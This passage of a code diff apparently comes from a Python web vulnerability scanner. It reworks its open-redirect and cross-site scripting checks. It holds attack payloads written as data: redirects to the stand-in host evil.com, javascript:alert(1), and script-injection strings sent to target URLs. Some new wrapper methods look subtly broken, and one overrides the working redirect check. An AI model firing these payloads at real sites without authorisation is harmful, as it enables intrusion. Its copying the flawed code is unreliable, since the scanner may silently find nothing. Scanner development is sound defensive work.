+                                    cvss_score=7.3,
+                                    description=f"XSS in parameter '{param}'",
+                                    remediation="Implement proper output encoding and CSP",
+                                    proof_of_concept=f"Payload '{payload}' reflected",
+                                    affected_url=url,
+                                    confidence=0.95
+                                ))
+                except:
+                    continue
+        
         return findings
     
     async def check_open_redirect(self) -> List[Vulnerability]:
         """Open redirect detection"""
         findings = []
         
-        payloads = [
+        redirect_payloads = [
             "//evil.com",
             "https://evil.com",
             "//evil.com@google.com",
-            "//evil.com\\google.com",
-            "/\\evil.com",
             "javascript:alert(1)"
         ]
         
-        redirect_params = [
-            "?redirect={}",
-            "?next={}",
-            "?url={}",
-            "?return={}",
-            "?return_to={}",
-            "?goto={}",
-            "?to={}",
-            "?out={}",
-            "?view={}",
-            "?dest={}"
-        ]
+        redirect_params = ["redirect", "next", "url", "return", "goto", "out"]
         
         for param in redirect_params:
-            for payload in payloads:
-                url = f"https://{self.target}{param.format(payload)}"
+            for payload in redirect_payloads:
+                url = f"https://{self.target}/?{param}={payload}"
                 try:
                     async with self.session.get(url, allow_redirects=False) as resp:
                         location = resp.headers.get('location', '')
-                        
                         if location and ("evil.com" in location or "javascript:" in location):
                             findings.append(Vulnerability(
                                 name="Open Redirect",
                                 class_type=VulnerabilityClass.OPEN_REDIRECT,
                                 severity="Medium",
                                 cvss_score=6.1,
-                                description=f"Open redirect at {param} with payload {payload}",
+                                description=f"Open redirect in parameter '{param}'",
                                 remediation="Use allowlist-based URL validation",
-                                proof_of_concept=f"Request to {url} redirects to {location}",
+                                proof_of_concept=f"Redirects to {location}",
                                 affected_url=url,
                                 confidence=1.0
                             ))
-                except Exception as e:
+                except:
                     continue
-                    
+        
         return findings
+    
+    def _is_encoded(self, text: str, payload: str) -> bool:
+        """Check if payload is HTML encoded"""
+        encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
+        return encoded_payload in text
+    
+    # Public methods for backward compatibility
+    async def check_idor(self) -> List[Vulnerability]:
+        return await self._check_idor() if hasattr(self, '_check_idor') else []
+    
+    async def check_auth_bypass(self) -> List[Vulnerability]:
+        return await self._check_auth_bypass() if hasattr(self, '_check_auth_bypass') else []
+    
+    async def check_cors(self) -> List[Vulnerability]:
+        return await self._check_cors() if hasattr(self, '_check_cors') else []
+    
+    async def check_csrf(self) -> List[Vulnerability]:
+        return await self._check_csrf() if hasattr(self, '_check_csrf') else []
+    
+    async def check_sqli(self) -> List[Vulnerability]:
+        return await self._check_sqli() if hasattr(self, '_check_sqli') else []
+    
+    async def check_nosqli(self) -> List[Vulnerability]:
+        return await self._check_nosqli() if hasattr(self, '_check_nosqli') else []
+    
+    async def check_xxe(self) -> List[Vulnerability]:
+        return await self._check_xxe() if hasattr(self, '_check_xxe') else []
+    
+    async def check_ssrf(self) -> List[Vulnerability]:
+        return await self._check_ssrf() if hasattr(self, '_check_ssrf') else []
+    
+    async def check_ssti(self) -> List[Vulnerability]:
+        return await self._check_ssti() if hasattr(self, '_check_ssti') else []
+    
+    async def check_lfi(self) -> List[Vulnerability]:
+        return await self._check_lfi() if hasattr(self, '_check_lfi') else []
+    
+    async def check_graphql_bola(self) -> List[Vulnerability]:
+        return await self._check_graphql_bola() if hasattr(self, '_check_graphql_bola') else []
+    
+    async def check_prototype_pollution(self) -> List[Vulnerability]:
+        return await self._check_prototype_pollution() if hasattr(self, '_check_prototype_pollution') else []
+    
+    async def check_request_smuggling(self) -> List[Vulnerability]:
+        return await self._check_request_smuggling() if hasattr(self, '_check_request_smuggling') else []
+    
+    async def check_subdomain_takeover(self) -> List[Vulnerability]:
+        return await self._check_subdomain_takeover() if hasattr(self, '_check_subdomain_takeover') else []
+    
+    async def check_rce(self) -> List[Vulnerability]:
+        return await self._check_rce() if hasattr(self, '_check_rce') else []
+    
+    async def check_business_logic(self) -> List[Vulnerability]:
+        return await self._check_business_logic() if hasattr(self, '_check_business_logic') else []
     
     async def check_xss(self) -> List[Vulnerability]:
-        """XSS detection with context-aware payloads"""
-        findings = []
-        
-        # Context-aware XSS payloads
-        xss_payloads = {
-            "html": "<img src=x onerror=alert(1)>",
-            "attribute": "\" onmouseover=alert(1) \"",
-            "script": "</script><script>alert(1)</script>",
-            "javascript": "javascript:alert(1)",
-            "style": "background:url('javascript:alert(1)')",
-            "json": {"payload": "<script>alert(1)</script>"}
-        }
-        
-        # Test input vectors
-        vectors = [
-            ("GET", "/search?q={}"),
-            ("GET", "/?q={}"),
-            ("POST", "/api/comment", {"comment": "{payload}"}),
-            ("POST", "/profile/update", {"name": "{payload}"})
-        ]
-        
-        for method, path, *data in vectors:
-            for context, payload in xss_payloads.items():
-                try:
-                    if method == "GET":
-                        url = f"https://{self.target}{path}".format(payload)
-                        async with self.session.get(url) as resp:
-                            text = await resp.text()
-                            if self._detect_xss_in_response(text, payload):
-                                findings.append(Vulnerability(
-                                    name=f"Cross-Site Scripting (XSS) - {context} context",
-                                    class_type=VulnerabilityClass.XSS,
-                                    severity="High",
-                                    cvss_score=7.3,
-                                    description=f"XSS detected in {context} context",
-                                    remediation="Implement proper output encoding and Content-Security-Policy",
-                                    proof_of_concept=f"Payload '{payload}' was reflected without encoding",
-                                    affected_url=url,
-                                    confidence=0.95
-                                ))
-                    else:  # POST
-                        url = f"https://{self.target}{path}"
-                        post_data = data[0].copy()
-                        for key in post_data:
-                            post_data[key] = post_data[key].format(payload=payload)
-                            
-                        async with self.session.post(url, json=post_data) as resp:
-                            text = await resp.text()
-                            if self._detect_xss_in_response(text, payload):
-                                findings.append(Vulnerability(
-                                    name=f"Cross-Site Scripting (XSS) - POST {context} context",
-                                    class_type=VulnerabilityClass.XSS,
-                                    severity="High",
-                                    cvss_score=7.3,
-                                    description=f"XSS detected in POST parameter with {context} context",
-                                    remediation="Validate and encode all user input",
-                                    proof_of_concept=f"POST {path} with {post_data}",
-                                    affected_url=url,
-                                    confidence=0.95
-                                ))
-                except Exception as e:
-                    continue
-                    
-        return findings
+        return await self._check_xss() if hasattr(self, '_check_xss') else []
     
-    def _detect_xss_in_response(self, response_text: str, payload: str) -> bool:
-        """Detect if XSS payload was reflected unsafely"""
-        # Remove safe contexts
-        if f"&lt;script&gt;" in response_text:
-            return False  # HTML encoded
-        if payload in response_text:
-            # Check if it's in a safe context
-            if f"&lt;{payload}&gt;" in response_text:
-                return False
-            if f"&#x3C;{payload}&#x3E;" in response_text:
-                return False
-            return True
-        return False
+    async def check_open_redirect(self) -> List[Vulnerability]:
+        return await self._check_open_redirect() if hasattr(self, '_check_open_redirect') else []
